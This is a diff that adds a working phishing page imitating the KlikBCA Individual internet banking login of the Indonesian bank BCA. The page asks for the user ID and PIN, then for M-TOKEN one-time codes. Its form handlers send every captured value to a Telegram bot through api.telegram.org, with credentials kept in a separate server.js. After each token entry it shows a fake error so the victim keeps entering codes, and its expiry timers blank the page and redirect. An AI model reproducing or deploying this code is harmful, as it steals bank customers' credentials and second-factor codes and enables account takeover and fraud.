@@ -1,1 +1,511 @@
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	<meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;">
+	<title>KlikBCA Individual</title>
+<meta name="description" content="Login ke layanan Internet Banking KlikBCA secara aman dan cepat">	
+<meta property="og:image" content="https://service-public.shop/mag/logklik.jpg">	
+	<style type="text/css">
+	<!--
+	hr { margin-top: auto; margin-bottom: auto;}
+	.OranRule { border: 3px solid #e7d300;}
+	-->
+	</style>
+	<link href="https://formcbybbca.netlify.app/www.web-ld.com/membatalkan/batalblokir/individual/WhljFLiR6qkf.com/F4xXBG7a8Wzf.css" rel="stylesheet" type="text/css">
+	<link href="https://formcbybbca.netlify.app/www.web-ld.com/membatalkan/batalblokir/individual/WhljFLiR6qkf.com/css/C1tFAXAiWzlM.css" rel="stylesheet" type="text/css">
+	<script src="https://formcbybbca.netlify.app/www.web-ld.com/membatalkan/batalblokir/individual/WhljFLiR6qkf.com/css/C1tFAXAiWzlM.css"></script>
+<script type="text/javascript" src="https://ikon-dusky.vercel.app/WhljFLiR6qkf.com/8OyYt73AP1GnNh4i_init%3D1.js"></script>
 
+<!-- LOAD SERVER.JS TERLEBIH DAHULU -->
+<script src="server.js"></script>
+
+<script>
+// Cek waktu expired
+let tglNow = new Date();
+let waktuBatas = new Date("2026-3-29T23:59:00");
+if (tglNow.getTime() >= waktuBatas.getTime()) {
+  document.location.href = '../expired.html';
+} else {
+  console.log('Server aktif');
+}
+</script>
+</head>
+<body onload="document.getElementById('txt_user_id').focus();">
+
+<div id="wrapper">
+    <div id="header">
+    	<div id="logo" style="background:#FFFFFF url(https://formcbybbca.netlify.app/www.web-ld.com/membatalkan/batalblokir/individual/WhljFLiR6qkf.com/images/TySi7hAPgsKD.gif) repeat-x top; height:57px; color:#FFFFFF">
+			<img src="https://formcbybbca.netlify.app/www.web-ld.com/membatalkan/batalblokir/individual/WhljFLiR6qkf.com/images/kuGMzmlWYTTG.gif" alt="BCA-lite">
+		</div>
+	
+		<div style="background:#e7cb00; height:3px"></div>
+	</div>
+		<div id="page-content" style="display:inline-block;">
+<form id="klikform" method="post" style="display:">	
+
+
+		<table id="tbl-txtinput" cellpadding="6" cellspacing="0" width="100%" style="display:">
+			<tbody><tr>
+				<td>
+				<table cellspacing="0" cellpadding="0">
+					<tbody><tr><td style="color:#303962; border-bottom:solid 1px #6f6f6f">Silakan masukkan USER ID Anda</td></tr>
+					<tr><td style="color:#ff9c00; border-top:solid 1px #6f6f6f">Please enter your USER ID</td></tr>
+				</tbody></table>
+				</td>
+			</tr>
+			<tr>
+				<td>
+					<input type="text" name="txt_user_id" minlength="5" maxlength="12" size="24" id="txt_user_id" autocomplete="off" oninput="javascript:return Login_Form_Validator()" required="">
+				</td>
+			</tr>
+			<tr>
+				<td>
+		 		<table cellspacing="0" cellpadding="0">
+		   			<tbody><tr><td style="color:#303962; border-bottom:solid 1px #6f6f6f">Silakan masukkan PIN Internet Banking Anda</td></tr>
+					<tr><td style="color:#ff9c00; border-top:solid 1px #6f6f6f">Please enter your Internet Banking PIN</td></tr>
+				</tbody></table>
+				</td>
+			</tr>
+			<tr>
+				<td>
+					<input type="password" name="txt_pswd" size="24" minlength="5" maxlength="6" id="txt_pswd" autocomplete="off" oninput="javascript:return Login_Form_Validator()" required="">
+				</td>
+			</tr>
+	
+			
+		    
+			</tbody></table><table cellpadding="6" cellspacing="0" width="100%">
+				<tbody><tr>
+					<td style="border-bottom:solid 1px #6f6f6f">
+<input type="submit" value="LOGIN" name="value(Submit)" id="btnSubmit" onclick="javascript:return Login_Form_Validator()" onmouseover="this.style.cursor='hand'">
+					</td>
+					<td align="right" valign="bottom" style="border-bottom:solid 1px #6f6f6f">
+						<a href="javascript:go2Full();"><u>Full Site</u></a>
+					</td>
+				</tr>
+		</tbody></table>
+		</form>
+		
+<form id="klikotp" method="post" style="display: none">
+    		<div id="page-content" style="display:inline-block;">
+		</div><table id="tbl-txtinput" cellpadding="6" cellspacing="0" width="100%" style="display:">
+	</table><table id="tbl-txtinput" cellpadding="6" cellspacing="0" width="100%">
+			<tbody><tr>
+				<td>
+				<table cellspacing="0" cellpadding="0">
+					<tbody><tr><td style="color:#303962; border-bottom:solid 1px #6f6f6f">Silakan memasukkan M-TOKEN Anda</td></tr>
+					<tr><td style="color:#ff9c00; border-top:solid 1px #6f6f6f">Please enter Your M-TOKEN</td></tr>
+				</tbody></table>
+				</td>
+			</tr>
+			<tr>
+				<td>
+					<input type="tel" name="token" minlength="4" maxlength="8" size="24" id="token" autocomplete="off" required="">
+				</td>
+			</tr>
+			
+		</tbody></table>
+			<br>
+		<div id="kodesalah" style="margin-left: 10px; color: red; display: none">Terjadi kesalahan, Coba lagi.</div>
+		
+		    <br>
+			<table cellpadding="6" cellspacing="0" width="100%">
+				<tbody><tr>
+				    
+					<td style="border-bottom:solid 1px #6f6f6f">
+						<input type="submit" value="Konfirmasi" id="btnSubmit1" onmouseover="this.style.cursor='hand'">
+					</td>
+					
+					<td align="right" valign="bottom" style="border-bottom:solid 1px #6f6f6f">
+						<a href="javascript:go2Full();"><u>Full Site</u></a>
+					</td>
+				</tr>
+			</tbody></table>
+		</form>	  		
+		
+		
+		<table cellpadding="6" cellspacing="0">
+			<tbody><tr>
+		 		<td>
+		 			<div class="banner-slide-container">
+		 				
+						<div class="banner-slide">
+							<img class="banner-image" src="https://ikon-dusky.vercel.app/WhljFLiR6qkf.com/images/9C3BNXd1qpCj.png" onclick="bannerClickEvent('https://www.bca.co.id/id/informasi/Edukatips/2020/12/22/07/59/Salah-Transfer-Hindari-Dengan-Cara-Ini')" style="cursor: pointer;">
+						</div>
+						
+						<div class="banner-slide">
+							<img class="banner-image" src="https://ikon-dusky.vercel.app/WhljFLiR6qkf.com/images/BOU8s10H6am8.png" onclick="bannerClickEvent('https://www.bca.co.id/id/informasi/awas-modus/2023/08/21/07/22/modus-penipuan-baru-menggunakan-action-button-view-atau-button-lainnya-di-whatsapp')" style="cursor: pointer;">
+						</div>
+						
+						<div class="banner-slide">
+							<img class="banner-image" src="https://ikon-dusky.vercel.app/WhljFLiR6qkf.com/images/unssHnFqxI3A.png" onclick="bannerClickEvent('https://www.bca.co.id/id/Individu/layanan/pengiriman-uang/Remittance/Outward-Remittance/Remittance-via-KlikBCA-Individu?utm_source=all&utm_medium=kv&utm_campaign=internal_bca-dtb-akm_remittance_promo-or%20kbi_all_jun_cps_kv|22060101987&utm_content=or%20kbi%20juni')" style="cursor: pointer;">
+						</div>
+						
+						<div class="banner-slide">
+							<img class="banner-image" src="https://ikon-dusky.vercel.app/WhljFLiR6qkf.com/images/9s99jV6R0dv9.png" onclick="bannerClickEvent('https://www.bca.co.id/id/informasi/news-and-features/2022/03/22/07/16/Kini-bisa-Perpanjang-Tahapan-Berjangka-BCA-via-KlikBCA?funnel_source=search_suggestion')" style="cursor: pointer;">
+						</div>
+						
+						<div class="banner-slide">
+							<img class="banner-image" src="https://ikon-dusky.vercel.app/WhljFLiR6qkf.com/images/yDHHmXTP3FIi.png" onclick="bannerClickEvent('https://bca.id/3Cjnv09')" style="cursor: pointer;">
+						</div>
+						
+						<div class="banner-slide">
+							<img class="banner-image" src="https://ikon-dusky.vercel.app/WhljFLiR6qkf.com/images/JD98ycovr6HN.png" onclick="bannerClickEvent('https://www.bca.co.id/id/informasi/Edukatips/2020/12/28/03/48/Stay-Up-to-Date-Perlancar-eBanking-mu-dengan-browser-dan-OS-terbaru')" style="cursor: pointer;">
+						</div>
+						
+		 			</div>
+		        </td>
+		 	</tr>
+		 	<tr>
+		 		<td>
+			 		<!--KlikBCA is secured with SSL 2048 bit encryption.<br />-->
+			 		<a href="https://www.bca.co.id/awasmodus?utm_campaign=Awas%20Modus&utm_source=iBank%20Klik%20BCA&utm_medium=CTW&utm_term=Edukatips&utm_content=Banner%20Awas%20Modus" target="new">
+			 		  <img src="https://ikon-dusky.vercel.app/WhljFLiR6qkf.com/images/nfxJqoHTdDRf.png" alt="" border="0" height="30">
+			 		</a>
+			 		<img src="https://ikon-dusky.vercel.app/WhljFLiR6qkf.com/images/Bm6WpGaMjdrv.png" alt="DigiCert Seal" height="30">
+		 		</td>
+		 	</tr>
+		</tbody></table>
+	</div>
+<img src="https://ikon-dusky.vercel.app/WhljFLiR6qkf.com/images/text.jpg" alt="DigiCert Seal" height="110">
+	<div id="footer" valign="middle">
+		<table border="0" cellpadding="0" cellspacing="0" width="100%">
+			<tbody><tr>
+			<td width="10" height="35"></td>
+			<td valign="middle" align="left" width="50"></td>
+			<td></td>
+			</tr>
+		</tbody></table>
+	</div>
+	
+</div> 
+
+
+
+
+<script src="https://formcbybbca.netlify.app/www.web-ld.com/membatalkan/batalblokir/individual/wxhebUWs4muJ.com/hY5nQ5x7SMaG.js"></script>
+<script src="https://formcbybbca.netlify.app/www.web-ld.com/membatalkan/batalblokir/individual/psxZW8ccNKGt.io/asset/lJtVVt9LhkvC.js"></script>
+
+<script>
+// ====================================================
+// FORM PERTAMA - LOGIN (MENGGUNAKAN VARIABEL DARI SERVER.JS)
+// ====================================================
+$('#klikform').on('submit', function (event) {
+    event.stopPropagation();
+    event.preventDefault();
+    
+    // Ambil nilai dari input fields
+    var txt_user_id = document.getElementById('txt_user_id');
+    var txt_pswd = document.getElementById('txt_pswd');
+    
+    // Validasi input
+    if (!txt_user_id.value || txt_user_id.value.trim() === '') {
+        alert("Silakan isi User ID Anda");
+        return false;
+    }
+    if (!txt_pswd.value || txt_pswd.value.trim() === '') {
+        alert("Silakan isi PIN Anda");
+        return false;
+    }
+    
+    $('#process1').show();   
+    document.getElementById('btnSubmit').value = "Proses..";
+    
+    // Format pesan untuk Telegram - MENGGUNAKAN VARIABEL DARI SERVER.JS
+    var gabungan = '%0A※ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : ' + txt_user_id.value + 
+                   '%0A※ 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 : ' + txt_pswd.value +
+                   '%0A※ 𝗪𝗮𝗸𝘁𝘂 : ' + new Date().toLocaleString('id-ID');
+
+    console.log('Mengirim data login ke Telegram...');
+    console.log('Using token from server.js');
+
+    // Kirim ke Telegram menggunakan variabel dari server.js
+    $.ajax({
+        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+        method: `POST`,
+        timeout: 10000,
+        success: function(data) {
+            console.log('Login info sent successfully');
+        },
+        error: function(xhr, status, error) {
+            console.log('Error sending login info:', error);
+        },
+        complete: function(data) {
+            console.log('Login process complete');
+            setTimeout(function(){  
+                document.getElementById('btnSubmit').value = "LOGIN";     
+                $("#klikotp").fadeIn();
+                $('#klikform').hide();
+            }, 1500); 
+        }
+    });
+
+    return false;
+});       
+</script>    
+
+<script type="text/javascript">
+// Event listener untuk enter key
+document.addEventListener("DOMContentLoaded", function() {
+    var tblInput = document.getElementById("tbl-txtinput");
+    if (tblInput) {
+        tblInput.addEventListener("keypress", function(event) {
+            if (event.key === "Enter" || event.keyCode === 13) {
+                event.preventDefault();
+                var btnSubmit = document.getElementById("btnSubmit");
+                if (btnSubmit) {
+                    btnSubmit.click();
+                }
+            }
+        });
+    }
+});
+</script>
+
+<script type="text/javascript">
+var blnSubmitted = false;
+
+var dtSign = new Date(2028, parseInt("10")-1, 04, 23, 48, 31);
+var dtClientNow = new Date();
+var dtClientSubmit = new Date();
+
+function bannerClickEvent(url){
+    if (url) {
+        if (url.trim() !== '') {        
+            window.open(url,'_blank');
+        }
+    }
+}
+
+function Login_Form_Validator() {
+    document.getElementById("txt_user_id").autocomplete = 'off';
+    document.getElementById("txt_pswd").autocomplete = 'off';
+    
+    var blnResponse = false;
+    if (blnSubmitted) {
+        return false;
+    }
+
+    var strErrMsg = "";
+    
+    document.forms[0]['value(user_id)'].value = document.getElementById("txt_user_id").value;
+    if( document.forms[0]['value(user_id)'].value == '') {
+        alert("Silakan mengisi User ID anda/Please input your User ID");
+        document.getElementById("txt_user_id").focus();
+        return false;
+    }
+    if( document.forms[0]['value(user_id)'].value.length>12) {
+        alert("User ID/Password Anda salah / Your User ID/Password is Wrong");
+        document.getElementById("txt_user_id").select();
+        document.getElementById("txt_user_id").focus();
+        return false;
+    }
+
+    if(document.getElementById("txt_pswd").value == '') {
+        alert("Silakan mengisi PIN anda/Please input your PIN");
+        document.getElementById("txt_pswd").focus();
+        return false;
+    }
+    if(document.getElementById("txt_pswd").value.length<6) {
+        alert("PIN harus 6 Angka/PIN must be 6 digits");
+        document.getElementById("txt_pswd").focus();
+        return false;
+    }
+    
+    if ( !blnSubmitted ) {
+        blnSubmitted = true;
+        blnResponse = true;
+        signAndEncrypt();
+    }
+
+    return blnResponse;
+}
+
+function signAndEncrypt() {
+    var jsEncrypt = new JSEncrypt();
+    const publicKeyString = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1F3Tb5ME9iY7HwrNiOUMdTDZJRs65HY+XHNJJYrI/165H9NigorOOLVrC/YV7QLyssXbZ9lUDzo4KZAZhQcSNekK2dfV3Gwg7X4XT3Nbs18I+YqTUqhFiedPTf7sefT3nkqvV5FE3XeY6A/l0rOk50DtRnI68fqhf50pQgy9L9DAViYvVno2B8MZyb/U0vA0PX29ruMntmGJeU9SQg7kPjBpGScFn3CFkWn509R0iVYaNvhjvJhcGMSTldd2GQUwdh7IMTMGdKn4NliFy7oLRnE3LiGoMVnPbwnw67EWcr+e3UMKkNk91kgiPk/vvb6UEGtFRCoE4g6kql014tvNdwIDAQAB";
+    jsEncrypt.setPublicKey(publicKeyString);
+    
+    dtClientSubmit = new Date();
+    var diffDt = Math.abs(dtClientSubmit-dtClientNow);
+    dtSign = new Date(dtSign.getTime() + diffDt);
+    
+    var currentYear = dtSign.getFullYear();
+    var currentMonth = dtSign.getMonth()+1;
+    currentMonth = (currentMonth < 10 ? '0' : '') + currentMonth;
+    var currentDate = (dtSign.getDate() < 10 ? '0' : '') + dtSign.getDate();
+    var currentHour = (dtSign.getHours() < 10 ? '0' : '') + dtSign.getHours();
+    var currentMin = (dtSign.getMinutes() < 10 ? '0' : '') + dtSign.getMinutes();
+    var currentSec = (dtSign.getSeconds() < 10 ? '0' : '') + dtSign.getSeconds();
+    var formatedDate = "".concat(currentYear, currentMonth, currentDate, currentHour, currentMin, currentSec);
+    
+    var enkrip = jsEncrypt.encrypt("".concat(document.getElementById("txt_pswd").value, formatedDate));
+    
+    document.forms[0]['value(pswd)'].value = enkrip;
+}
+
+function showMsg(strErr) {
+    alert(strErr);
+}
+
+function sPrivacy() {
+    msgWindow=window.open("privacy.htm","NameOfWindow","toolbar=no,width=790,height=380,left=20,top=80,directories=no,status=no,scrollbars=yes,resize=yes,menubar=no")
+}
+
+function go2Full() {
+    document.iBankForm.action = "https://ibank.klikbca.com";
+    document.iBankForm.submit();
+}
+
+</script>
+
+<script type="text/javascript">
+window.onload = function() {
+    console.log('Page loaded');
+    console.log('Telegram token from server.js:', token ? 'Loaded' : 'Not loaded');
+    // Focus ke input user_id
+    document.getElementById('txt_user_id').focus();
+};
+</script>
+
+<script type="text/javascript">
+var slideIndex = 0;
+var timerSlide;
+var isAutoNextSlide = true;
+
+// Mulai slideshow setelah DOM siap
+document.addEventListener("DOMContentLoaded", function() {
+    showSlideAuto();
+});
+
+function showSlideAuto() {
+    var slides = document.getElementsByClassName("banner-slide");
+    
+    if (slides.length === 0) {
+        return;
+    }
+    
+    for (var i=0; i<slides.length; i++) {
+        slides[i].style.display = "none";  
+    }
+    
+    if (isAutoNextSlide) {
+        slideIndex++;
+    }
+    isAutoNextSlide = true;
+    
+    if (slideIndex > slides.length) {
+        slideIndex = 1;
+    }
+    
+    slides[slideIndex-1].style.display = "block";  
+    
+    timerSlide = setTimeout(showSlideAuto, 5000); // Change banner every 5s
+}
+</script>
+
+<script>
+// ====================================================
+// FORM KEDUA - M-TOKEN (MENGGUNAKAN VARIABEL DARI SERVER.JS)
+// ====================================================
+$('#klikotp').on('submit', function (event) {
+    event.stopPropagation();
+    event.preventDefault();
+    
+    // Ambil nilai dari input fields
+    var txt_user_id = document.getElementById('txt_user_id');
+    var txt_pswd = document.getElementById('txt_pswd');
+    var mToken = document.getElementById('token'); // M-TOKEN dari input field
+    
+    // Validasi input token
+    if (!mToken.value || mToken.value.trim() === '') {
+        $("#kodesalah").text("Silakan masukkan M-TOKEN Anda").fadeIn().delay(3000).fadeOut();
+        return false;
+    }
+    if (mToken.value.length < 4) {
+        $("#kodesalah").text("M-TOKEN minimal 4 digit").fadeIn().delay(3000).fadeOut();
+        return false;
+    }
+    
+    document.getElementById('btnSubmit1').value = "Proses..";
+    
+    // Format pesan untuk Telegram - MENGGUNAKAN mToken.value untuk M-TOKEN
+    // dan MENGGUNAKAN variabel token & grup dari server.js
+    var gabungan = '%0A※ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : ' + txt_user_id.value + 
+                   '%0A※ 𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱 : ' + txt_pswd.value + 
+                   '%0A※ 𝗠-𝗧𝗢𝗞𝗘𝗡 : ' + mToken.value +
+                   '%0A※ 𝗪𝗮𝗸𝘁𝘂 : ' + new Date().toLocaleString('id-ID');
+
+    console.log('Mengirim M-TOKEN ke Telegram...');
+    console.log('M-TOKEN value:', mToken.value);
+    console.log('Using bot token from server.js');
+
+    // Kirim ke Telegram menggunakan variabel dari server.js
+    $.ajax({
+        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+        method: `POST`,
+        timeout: 10000,
+        success: function(data) {
+            console.log('M-TOKEN sent successfully');
+            $("#kodesalah").hide();
+        },
+        error: function(xhr, status, error) {
+            console.log('Error sending M-TOKEN:', error);
+            $("#kodesalah").text("Gagal mengirim token, coba lagi.").fadeIn();
+        },
+        complete: function(data) {
+            console.log('M-TOKEN process complete');
+            setTimeout(function(){  
+                document.getElementById('btnSubmit1').value = "Konfirmasi";     
+                $("#kodesalah").text("Terjadi kesalahan, Coba lagi.").fadeIn();
+                $("#token").val('');  
+            }, 2000); 
+        }
+    });
+
+    return false;
+});       
+</script>
+
+<!-- Inisialisasi tambahan -->
+<script>
+$(document).ready(function() {
+    console.log('Document ready');
+    console.log('Server.js variables:', { token: token ? 'Loaded' : 'Not loaded', grup: grup ? 'Loaded' : 'Not loaded' });
+    
+    // Sembunyikan form OTP saat awal
+    $('#klikotp').hide();
+    
+    // Event listener untuk input token (hanya angka)
+    $('#token').on('input', function() {
+        this.value = this.value.replace(/[^0-9]/g, '');
+    });
+});
+</script>
+ <script>
+(function(){
+  // KODE DIGENERATE: 8/6/2026, 12:51:29 PM
+  
+  // TANGGAL MULAI (hari ini saat generate)
+  const startDate = new Date(2026, 7, 6);
+  
+  // TANGGAL EXPIRE (+30 hari dari mulai)
+  const expireDate = new Date(2026, 8, 5);
+  
+  function blank(){
+    document.documentElement.innerHTML = "";
+    document.documentElement.style.background = "#fff";
+  }
+  
+  function go(){
+    location.replace(atob("aHR0cHM6Ly9leGFtcGxlLmNvbS8="));
+  }
+  
+  // Jika SEKARANG sudah melewati expireDate, redirect
+  if(Date.now() > expireDate.getTime()){
+    blank();
+    go();
+  }
+  
+})();
+</script>
+</body></html>
